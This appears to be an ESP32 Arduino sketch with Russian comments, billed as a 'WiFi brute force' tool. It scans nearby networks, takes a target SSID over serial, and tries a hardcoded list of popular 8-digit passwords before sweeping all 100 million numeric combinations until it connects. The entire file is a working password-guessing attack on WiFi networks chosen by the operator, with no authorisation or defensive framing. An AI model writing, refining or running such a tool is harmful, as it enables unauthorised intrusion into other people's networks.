#include <WiFi.h>

// Конфигурация
const int TIMEOUT = 8000; // Таймаут подключения в мс
String targetSSID = "";   // Целевая WiFi сеть

// ============ ПОПУЛЯРНЫЕ 8-ЗНАЧНЫЕ ПАРОЛИ ============
const char* popular8digit[] = {
  // ТОП-10 (12345678 на первом месте!)
  "12345678",   // САМЫЙ ПОПУЛЯРНЫЙ!
  "87654321",
  "11111111",
  "00000000",
  "22222222",
  "33333333",
  "44444444",
  "55555555",
  "66666666",
  "77777777",
  "88888888",
  "99999999",
  "12341234",
  "43214321",
  "12121212",
  "13131313",
  "14141414",
  "15151515",
  "16161616",
  "17171717",
  "18181818",
  "19191919",
  "10101010",
  "20202020",
  
  // Годы
  "19901990",
  "19911991",
  "19921992",
  "19931993",
  "19941994",
  "19951995",
  "19961996",
  "19971997",
  "19981998",
  "19991999",
  "20002000",
  "20012001",
  "20022002",
  "20032003",
  "20042004",
  "20052005",
  "20062006",
  "20072007",
  "20082008",
  "20092009",
  "20102010",
  "20112011",
  "20122012",
  "20132013",
  "20142014",
  "20152015",
  "20162016",
  "20172017",
  "20182018",
  "20192019",
  "20202020",
  "20212021",
  "20222022",
  "20232023",
  "20242024",
  
  // Даты
  "01011990",
  "01011991",
  "01011992",
  "01011993",
  "01011994",
  "01011995",
  "01011996",
  "01011997",
  "01011998",
  "01011999",
  "01012000",
  "01012001",
  "01012002",
  "01012003",
  "01012004",
  "01012005",
  "01012006",
  "01012007",
  "01012008",
  "01012009",
  "01012010",
  "01012011",
  "01012012",
  "01012013",
  "01012014",
  "01012015",
  "01012016",
  "01012017",
  "01012018",
  "01012019",
  "01012020",
  
  // Телефонные
  "12345678",
  "23456789",
  "34567890",
  "45678901",
  "56789012",
  "67890123",
  "78901234",
  "89012345",
  "90123456",
  "01234567",
  
  // Повторы
  "11223344",
  "12121212",
  "12344321",
  "12345678", // еще раз для верности
  "13571357",
  "24682468",
  "11223344",
  "22334455",
  "33445566",
  "44556677",
  "55667788",
  "66778899",
  "77889900",
  "88990011",
  "99001122",
  
  // Красивые
  "10203040",
  "12345678", // еще раз :)
  "14725836",
  "15935782",
  "25802580",
  "36903690",
  "48151623",
  "52461397",
  "78945612",
  "95175382"
};

// Счетчики
int popularCount = 0;
int digitCount = 0;
int currentDigit = 0;
unsigned long startTime = 0;
bool found = false;

void setup() {
  Serial.begin(115200);
  delay(1000);
  
  printWelcomeScreen();
  
  WiFi.mode(WIFI_STA);
  WiFi.setAutoReconnect(false);
  WiFi.persistent(false);
}

void loop() {
  if(Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    processCommand(command);
  }
}

void printWelcomeScreen() {
  Serial.println("\n====================================================");
  Serial.println("     WIFI BRUTE FORCE - ТОЛЬКО 8 ЗНАКОВ");
  Serial.println("====================================================");
  Serial.println("⚡ СНАЧАЛА ПРОВЕРЯЕМ 12345678! ⚡");
  Serial.println("====================================================");
  Serial.println("Команды:");
  Serial.println("  scan              - сканировать сети");
  Serial.println("  set [SSID]        - установить цель");
  Serial.println("  start             - начать перебор");
  Serial.println("  popular           - показать популярные пароли");
  Serial.println("  stats             - статистика");
  Serial.println("  help              - помощь");
  Serial.println("====================================================\n");
}

void processCommand(String cmd) {
  if(cmd == "help" || cmd == "h") {
    printHelp();
  }
  else if(cmd == "scan") {
    scanNetworks();
  }
  else if(cmd.startsWith("set ")) {
    targetSSID = cmd.substring(4);
    targetSSID.trim();
    Serial.printf("✅ Цель установлена: %s\n", targetSSID.c_str());
  }
  else if(cmd == "start") {
    if(targetSSID.length() > 0) {
      startBruteForce();
    } else {
      Serial.println("❌ Сначала установите цель (set SSID)");
    }
  }
  else if(cmd == "popular") {
    showPopularPasswords();
  }
  else if(cmd == "stats") {
    showStats();
  }
}

void printHelp() {
  Serial.println("\n=== ДОСТУПНЫЕ КОМАНДЫ ===");
  Serial.println("scan              - сканировать WiFi сети");
  Serial.println("set ДОМАШНИЙ      - установить цель");
  Serial.println("start             - начать перебор");
  Serial.println("popular           - показать популярные пароли");
  Serial.println("stats             - статистика");
  Serial.println("help              - показать помощь");
  Serial.println("==========================\n");
}

void scanNetworks() {
  Serial.println("\n🔍 Сканирование WiFi сетей...");
  
  int n = WiFi.scanNetworks();
  
  if(n == 0) {
    Serial.println("❌ Сети не найдены");
  } else {
    Serial.printf("✅ Найдено %d сетей:\n", n);
    Serial.println("----------------------------");
    for(int i = 0; i < n; i++) {
      Serial.printf("%d. %s ", i+1, WiFi.SSID(i).c_str());
      Serial.printf("(%d dBm) ", WiFi.RSSI(i));
      
      if(WiFi.encryptionType(i) == WIFI_AUTH_OPEN) {
        Serial.print("[ОТКРЫТАЯ]");
      } else {
        Serial.print("[ЗАЩИЩЕНА]");
      }
      Serial.println();
    }
    Serial.println("----------------------------");
  }
  
  WiFi.scanDelete();
}

void showPopularPasswords() {
  int total = sizeof(popular8digit) / sizeof(popular8digit[0]);
  
  Serial.println("\n=== ПОПУЛЯРНЫЕ 8-ЗНАЧНЫЕ ПАРОЛИ ===");
  for(int i = 0; i < total; i+=5) {
    Serial.printf("%3d: %s  %3d: %s  %3d: %s  %3d: %s  %3d: %s\n",
      i+1, popular8digit[i],
      i+2, popular8digit[i+1],
      i+3, popular8digit[i+2],
      i+4, popular8digit[i+3],
      i+5, popular8digit[i+4]);
    
    if(i % 25 == 20) {
      Serial.println("--- Нажмите любую клавишу для продолжения ---");
      while(!Serial.available());
      Serial.read();
    }
  }
  Serial.printf("Всего популярных паролей: %d\n", total);
}

void showStats() {
  Serial.println("\n=== СТАТИСТИКА ===");
  Serial.printf("Проверено популярных: %d\n", popularCount);
  Serial.printf("Проверено цифровых: %d\n", digitCount);
  Serial.printf("Всего попыток: %d\n", popularCount + digitCount);
  Serial.printf("Текущий цифровой: %08d\n", currentDigit);
  
  if(startTime > 0) {
    unsigned long elapsed = (millis() - startTime) / 1000;
    int minutes = elapsed / 60;
    int seconds = elapsed % 60;
    Serial.printf("Время работы: %d мин %d сек\n", minutes, seconds);
    
    if(digitCount > 0) {
      int total = 100000000; // 100 млн комбинаций
      int remaining = total - currentDigit;
      float percent = (currentDigit * 100.0) / total;
      Serial.printf("Прогресс: %.2f%% (осталось %d комбинаций)\n", percent, remaining);
    }
  }
}

// ============ ОСНОВНАЯ ФУНКЦИЯ ПЕРЕБОРА ============
void startBruteForce() {
  Serial.printf("\n🔓 ПЕРЕБОР ДЛЯ: %s\n", targetSSID.c_str());
  Serial.println("========================================");
  Serial.println("⚡ ЭТАП 1: ПРОВЕРКА 12345678 ⚡");
  Serial.println("========================================\n");
  
  startTime = millis();
  popularCount = 0;
  digitCount = 0;
  currentDigit = 0;
  found = false;
  
  // ЭТАП 0: СНАЧАЛА 12345678 (САМЫЙ ПОПУЛЯРНЫЙ)
  Serial.print("[СУПЕР-ПОПУЛЯРНЫЙ] Пробую: 12345678 ");
  if(tryPassword("12345678")) {
    successFound("12345678", true);
    return;
  }
  
  // ЭТАП 1: ВСЕ ОСТАЛЬНЫЕ ПОПУЛЯРНЫЕ
  int totalPopular = sizeof(popular8digit) / sizeof(popular8digit[0]);
  
  Serial.println("\n\n========================================");
  Serial.println("📋 ЭТАП 2: ОСТАЛЬНЫЕ ПОПУЛЯРНЫЕ ПАРОЛИ");
  Serial.println("========================================\n");
  
  for(int i = 0; i < totalPopular; i++) {
    // Пропускаем 12345678 (уже проверили)
    if(strcmp(popular8digit[i], "12345678") == 0) continue;
    
    // Проверка остановки
    if(checkForStop()) return;
    
    popularCount++;
    int percent = (i * 100) / totalPopular;
    
    Serial.printf("[ПОПУЛЯРНЫЙ %d%%] [%d/%d] Пробую: %s ", 
      percent, i+1, totalPopular, popular8digit[i]);
    
    if(tryPassword(popular8digit[i])) {
      successFound(popular8digit[i], true);
      return;
    }
  }
  
  Serial.println("\n\n========================================");
  Serial.println("🔢 ЭТАП 3: ПЕРЕБОР ВСЕХ ЦИФРОВЫХ КОМБИНАЦИЙ");
  Serial.println("⚠️  ВНИМАНИЕ: 100 МИЛЛИОНОВ КОМБИНАЦИЙ!");
  Serial.println("========================================\n");
  
  // ЭТАП 2: ВСЕ ЦИФРОВЫЕ КОМБИНАЦИИ 00000000 - 99999999
  for(unsigned long i = 0; i <= 99999999; i++) {
    // Проверка остановки
    if(checkForStop()) return;
    
    // Пропускаем популярные (уже проверили)
    bool skip = false;
    for(int j = 0; j < totalPopular; j++) {
      char numStr[9];
      sprintf(numStr, "%08lu", i);
      if(strcmp(popular8digit[j], numStr) == 0) {
        skip = true;
        break;
      }
    }
    if(skip) continue;
    
    digitCount++;
    currentDigit = i;
    
    // Формируем 8-значное число с ведущими нулями
    char password[9];
    sprintf(password, "%08lu", i);
    
    // Показываем прогресс каждые 10000 попыток
    if(i % 10000 == 0) {
      float percent = (i * 100.0) / 100000000;
      Serial.printf("[ЦИФРОВОЙ %.2f%%] [%lu/100M] Пробую: %s ", 
        percent, i, password);
    } else {
      Serial.printf("[ЦИФРОВОЙ] [%lu/100M] Пробую: %s ", i, password);
    }
    
    if(tryPassword(password)) {
      successFound(password, false);
      return;
    }
    
    // Небольшая пауза каждые 100 попыток
    if(i % 100 == 0) delay(1);
  }
  
  Serial.println("\n\n❌❌❌ ПАРОЛЬ НЕ НАЙДЕН! ❌❌❌");
  Serial.println("Проверено 100 миллионов комбинаций!");
}

// Проверка на остановку
bool checkForStop() {
  if(Serial.available()) {
    char c = Serial.read();
    if(c == 'q' || c == 'Q') {
      Serial.println("\n⏹️ Перебор остановлен");
      showStats();
      return true;
    }
    if(c == 's') {
      showStats();
    }
  }
  return false;
}

// Попытка подключения
bool tryPassword(const char* password) {
  WiFi.begin(targetSSID.c_str(), password);
  
  unsigned long startTryTime = millis();
  while(WiFi.status() != WL_CONNECTED && (millis() - startTryTime) < TIMEOUT) {
    delay(200);
    Serial.print(".");
    
    // Проверка остановки во время попытки
    if(Serial.available()) {
      char c = Serial.read();
      if(c == 'q') {
        WiFi.disconnect();
        Serial.println("\n⏹️ Остановлено");
        return false;
      }
    }
  }
  
  if(WiFi.status() == WL_CONNECTED) {
    Serial.println(" ✅");
    return true;
  } else {
    Serial.println(" ❌");
    WiFi.disconnect(true, true);
    return false;
  }
}

// Успех!
void successFound(const char* password, bool isPopular) {
  unsigned long elapsed = (millis() - startTime) / 1000;
  int minutes = elapsed / 60;
  int seconds = elapsed % 60;
  
  Serial.println("\n\n");
  Serial.println("╔══════════════════════════════════════════════╗");
  Serial.println("║         🎉  ПАРОЛЬ НАЙДЕН!  🎉               ║");
  Serial.println("╠══════════════════════════════════════════════╣");
  Serial.printf("║  📶 СЕТЬ:    %-36s ║\n", targetSSID.c_str());
  Serial.printf("║  🔑 ПАРОЛЬ:  %-36s ║\n", password);
  Serial.printf("║  💻 IP:      %-36s ║\n", WiFi.localIP().toString().c_str());
  Serial.printf("║  📊 СИГНАЛ:  %d dBm                           ║\n", WiFi.RSSI());
  Serial.println("╠══════════════════════════════════════════════╣");
  Serial.printf("║  📊 Тип:     %-36s ║\n", isPopular ? "ПОПУЛЯРНЫЙ" : "ЦИФРОВОЙ");
  Serial.printf("║  📊 Попыток: %-36d ║\n", popularCount + digitCount);
  Serial.printf("║  ⏱️  Время:  %d мин %d сек                    ║\n", minutes, seconds);
  Serial.println("╚══════════════════════════════════════════════╝");
  Serial.println("\n⚡⚡⚡ ПАРОЛЬ СОХРАНЕН! ⚡⚡⚡\n");
  
  // Мигаем светодиодом
  pinMode(2, OUTPUT);
  for(int i = 0; i < 20; i++) {
    digitalWrite(2, HIGH);
    delay(100);
    digitalWrite(2, LOW);
    delay(100);
  }
  
  // Бесконечный вывод найденного пароля
  while(true) {
    delay(3000);
    Serial.printf("✅✅✅ ПАРОЛЬ: %s ✅✅✅\n", password);
    Serial.printf("⏱️  Найден за %d мин %d сек\n", minutes, seconds);
  }
}
